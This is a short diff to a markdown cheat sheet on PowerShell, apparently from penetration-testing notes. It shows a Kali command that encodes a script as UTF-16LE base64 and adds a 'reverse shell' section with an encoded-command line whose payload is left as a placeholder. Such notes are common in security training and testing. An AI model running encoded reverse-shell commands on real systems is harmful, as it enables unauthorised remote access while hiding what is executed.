@@ -1,9 +1,14 @@
 # PowerShell
 
-## Windows-like PowerShell Base64 Format
+# Windows-like PowerShell Base64 Format
 In Kali:
 ```
 cat filename.ps1 | iconv -t UTF-16LE | base64 -w 0
+```
+
+# Powershell Execute Reverse Shell
+```
+powershell -enc <base64-payload>
 ```
 
 
